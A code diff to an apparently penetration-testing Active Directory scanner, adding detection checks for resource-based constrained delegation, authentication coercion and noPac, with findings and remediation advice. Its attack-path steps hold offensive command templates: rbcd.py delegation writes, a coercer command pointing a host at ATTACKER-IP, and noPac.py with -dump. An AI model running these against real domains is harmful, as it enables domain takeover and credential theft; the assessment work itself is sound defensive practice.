@@ -7,6 +7,7 @@ With a valid domain account we can inspect the directory in far more depth:
 * Share enumeration with read/write mapping
 * Kerberoastable service accounts
 * Unconstrained / constrained delegation
+* Resource-based constrained delegation (RBCD) enumeration
 * MachineAccountQuota (adds risk for several privilege-escalation paths)
 * LDAP signing / channel binding posture
 
@@ -20,7 +21,7 @@ import re
 
 from ..paths import Capability, Noise, PathStep, Reliability
 from ..runner import CheckResult, Finding, Severity, Target, ToolRunner
-from . import require_tool, skipped_result
+from . import looks_like_failure, require_tool, skipped_result
 
 CATEGORY = "authenticated"
 
@@ -367,12 +368,276 @@ def check_machine_account_quota(
     return result
 
 
+def check_rbcd(runner: ToolRunner, target: Target, timeout: int = 240) -> CheckResult:
+    """Actively enumerate resource-based constrained delegation across hosts.
+
+    Two things are reported:
+
+    * Computer objects that already have
+      ``msDS-AllowedToActOnBehalfOfOtherIdentity`` populated (an existing RBCD
+      relationship worth reviewing / potentially abusable).
+    * A path step noting that any computer object over which we hold write
+      access can have RBCD configured against it.
+
+    This complements the BloodHound-sourced RBCD edges by reading the attribute
+    directly via LDAP, so RBCD opportunities surface even without a graph.
+    """
+    name = "RBCD enumeration (msDS-AllowedToActOnBehalfOfOtherIdentity)"
+    guard = _guard(runner, target, name)
+    if guard:
+        return guard
+
+    result = _base_result(name)
+    # NetExec's LDAP --query lets us read the RBCD attribute across computers.
+    argv = [
+        "nxc",
+        "ldap",
+        target.host,
+        *target.nxc_auth_args(),
+        "--query",
+        "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
+        "sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity",
+    ]
+    out = runner.run(argv, timeout=timeout)
+    result.command = out.command
+    result.raw_output = out.combined
+    result.return_code = out.return_code
+    result.duration_seconds = out.duration_seconds
+    if out.error:
+        result.error = out.error
+        return result
+
+    text = out.combined
+    # Hosts with the attribute present -> existing RBCD relationships.
+    configured = re.findall(r"(\S+\$)\s", text)
+    if re.search(r"AllowedToActOnBehalfOfOtherIdentity", text, re.IGNORECASE) and configured:
+        result.add_finding(
+            Finding(
+                title="Existing RBCD relationships found",
+                severity=Severity.MEDIUM,
+                target=target.domain or target.host,
+                description=(
+                    "One or more computer accounts have "
+                    "msDS-AllowedToActOnBehalfOfOtherIdentity populated. Review "
+                    "these delegation relationships; an attacker controlling a "
+                    "referenced principal can impersonate users to the host."
+                ),
+                evidence="\n".join(sorted(set(configured))[:30]) or text[:600],
+                remediation=(
+                    "Audit RBCD configuration; remove entries that are not "
+                    "explicitly required and monitor writes to this attribute."
+                ),
+            )
+        )
+
+    # Regardless of existing config, holding write over a computer object lets
+    # us configure RBCD against it. This connects DACL control -> RBCD.
+    result.add_step(
+        PathStep(
+            name="Write over computer object -> configure RBCD",
+            technique="RBCD-Configure",
+            requires=frozenset({Capability.DACL_CONTROL, Capability.MACHINE_ACCOUNT}),
+            grants=Capability.RBCD,
+            command=(
+                "rbcd.py -delegate-to 'TARGET$' -delegate-from 'PWN$' "
+                f"-action write {target.domain or 'DOMAIN'}/USER:PASS"
+            ),
+            description=(
+                "With write access over a target computer object and a "
+                "controlled machine account, set "
+                "msDS-AllowedToActOnBehalfOfOtherIdentity to enable RBCD."
+            ),
+            reliability=Reliability.HIGH,
+            noise=Noise.MODERATE,
+            source="check",
+        )
+    )
+    return result
+
+
+def check_coercion(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
+    """Detect authentication-coercion surfaces on the target.
+
+    Probes for the common coercion vectors that let an attacker force a
+    computer (often a DC) to authenticate to an attacker-controlled host:
+
+    * MS-EFSR  (PetitPotam)
+    * MS-RPRN  (PrinterBug / spooler)
+    * MS-DFSNM (DFSCoerce)
+    * MS-FSRVP (ShadowCoerce)
+
+    Uses NetExec's ``coerce_plus`` module in listen/check mode. A coercible
+    host makes the WebDAV/relay and ESC8 chains real rather than assumed, so a
+    positive result grants the COERCIBLE_AUTH capability.
+    """
+    name = "Authentication coercion surfaces (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce)"
+    guard = _guard(runner, target, name)
+    if guard:
+        return guard
+
+    result = _base_result(name)
+    # coerce_plus with CHECK=True probes the vectors without firing a relay.
+    argv = [
+        "nxc", "smb", target.host, *target.nxc_auth_args(),
+        "-M", "coerce_plus", "-o", "CHECK=True",
+    ]
+    out = runner.run(argv, timeout=timeout)
+    result.command = out.command
+    result.raw_output = out.combined
+    result.return_code = out.return_code
+    result.duration_seconds = out.duration_seconds
+    if out.error:
+        result.error = out.error
+        return result
+
+    text = out.combined
+    # coerce_plus reports vulnerable methods, e.g. "VULNERABLE" / method names.
+    vectors = []
+    for label, pat in (
+        ("MS-EFSR (PetitPotam)", r"efsr|petitpotam"),
+        ("MS-RPRN (PrinterBug)", r"rprn|printerbug|spooler"),
+        ("MS-DFSNM (DFSCoerce)", r"dfsnm|dfscoerce"),
+        ("MS-FSRVP (ShadowCoerce)", r"fsrvp|shadowcoerce"),
+    ):
+        if re.search(pat, text, re.IGNORECASE) and re.search(r"vulnerable|coerc", text, re.IGNORECASE):
+            vectors.append(label)
+
+    if vectors:
+        result.add_finding(
+            Finding(
+                title="Host is coercible to authenticate",
+                severity=Severity.HIGH,
+                target=target.host,
+                description=(
+                    "The host responded to one or more coercion vectors ("
+                    + ", ".join(vectors) + "). It can be forced to authenticate "
+                    "to an attacker-controlled listener, enabling NTLM relay "
+                    "(to LDAP for RBCD/shadow-creds, or to AD CS for ESC8)."
+                ),
+                evidence=text[:800],
+                remediation=(
+                    "Patch coercion CVEs, disable the Print Spooler on DCs where "
+                    "not needed, restrict RPC, and enforce SMB/LDAP signing and "
+                    "channel binding to neutralise relay."
+                ),
+            )
+        )
+        result.add_step(
+            PathStep(
+                name="Coerce host authentication",
+                technique="Coercion",
+                requires=frozenset({Capability.LOW_PRIV_USER}),
+                grants=Capability.COERCIBLE_AUTH,
+                command=(
+                    f"coercer coerce -u USER -p PASS -t {target.host} -l ATTACKER-IP"
+                ),
+                description="Force the host to authenticate to an attacker listener.",
+                reliability=Reliability.HIGH,
+                noise=Noise.LOUD,
+                detail=", ".join(vectors),
+                source="check",
+            )
+        )
+    return result
+
+
+def check_nopac(runner: ToolRunner, target: Target, timeout: int = 180) -> CheckResult:
+    """Detect noPac (CVE-2021-42278/42287) - sAMAccountName spoofing to DA.
+
+    When a DC is unpatched and MachineAccountQuota permits creating a computer
+    account, noPac impersonates a DC to obtain a privileged ticket, which is a
+    direct, high-reliability route to DCSync / Domain Admin.
+    """
+    name = "noPac (CVE-2021-42278 / CVE-2021-42287)"
+    guard = _guard(runner, target, name)
+    if guard:
+        return guard
+
+    result = _base_result(name)
+    argv = ["nxc", "smb", target.host, *target.nxc_auth_args(), "-M", "nopac"]
+    out = runner.run(argv, timeout=timeout)
+    result.command = out.command
+    result.raw_output = out.combined
+    result.return_code = out.return_code
+    result.duration_seconds = out.duration_seconds
+    if out.error:
+        result.error = out.error
+        return result
+
+    text = out.combined
+    # The nopac module indicates vulnerability, e.g. "VULNERABLE" / "got TGT".
+    if re.search(r"vulnerable|nopac.*success|got tgt", text, re.IGNORECASE):
+        result.add_finding(
+            Finding(
+                title="Domain Controller vulnerable to noPac",
+                severity=Severity.CRITICAL,
+                target=target.host,
+                description=(
+                    "The DC is vulnerable to noPac (CVE-2021-42278/42287). Any "
+                    "authenticated user who can create a computer account can "
+                    "impersonate a domain controller and obtain privileged "
+                    "tickets, leading directly to Domain Admin / DCSync."
+                ),
+                evidence=text[:600],
+                remediation=(
+                    "Apply the November 2021 (and later) patches on all DCs and "
+                    "set ms-DS-MachineAccountQuota to 0."
+                ),
+            )
+        )
+        result.add_step(
+            PathStep(
+                name="noPac -> privileged ticket / DCSync",
+                technique="noPac",
+                requires=frozenset({Capability.LOW_PRIV_USER, Capability.MACHINE_ACCOUNT}),
+                grants=Capability.DCSYNC,
+                command=(
+                    "noPac.py -dc-ip {dc} DOMAIN/USER:PASS -dump".format(
+                        dc=target.dc_ip or "DC-IP"
+                    )
+                ),
+                description=(
+                    "Exploit noPac to impersonate a DC and dump secrets "
+                    "(equivalent to DCSync / Domain Admin)."
+                ),
+                reliability=Reliability.HIGH,
+                noise=Noise.LOUD,
+                source="check",
+            )
+        )
+    return result
+
+
+def _mark_inconclusive_on_failure(results: list[CheckResult]) -> list[CheckResult]:
+    """Post-process: a ran-but-empty check whose output shows a connection or
+    auth failure is inconclusive, not clean.
+
+    Centralising this keeps every authenticated check from repeating the same
+    boilerplate while ensuring a failed auth/connection is never silently read
+    as "not vulnerable".
+    """
+    for r in results:
+        if r.skipped or r.error or r.findings or r.inconclusive:
+            continue
+        signal = looks_like_failure(r.raw_output)
+        if signal:
+            r.mark_inconclusive(
+                f"check ran but output shows '{signal}'; result may not reflect "
+                "the target's true state"
+            )
+    return results
+
+
 def run_all(runner: ToolRunner, target: Target, timeout: int = 300) -> list[CheckResult]:
     """Run every authenticated check and return the results."""
-    return [
+    results = [
         check_admin_access(runner, target, timeout=min(timeout, 120)),
         check_password_policy(runner, target, timeout=min(timeout, 120)),
         check_kerberoast(runner, target, timeout=timeout),
         check_delegation(runner, target, timeout=min(timeout, 180)),
         check_machine_account_quota(runner, target, timeout=min(timeout, 120)),
+        check_rbcd(runner, target, timeout=min(timeout, 240)),
+        check_coercion(runner, target, timeout=min(timeout, 180)),
+        check_nopac(runner, target, timeout=min(timeout, 180)),
     ]
+    return _mark_inconclusive_on_failure(results)
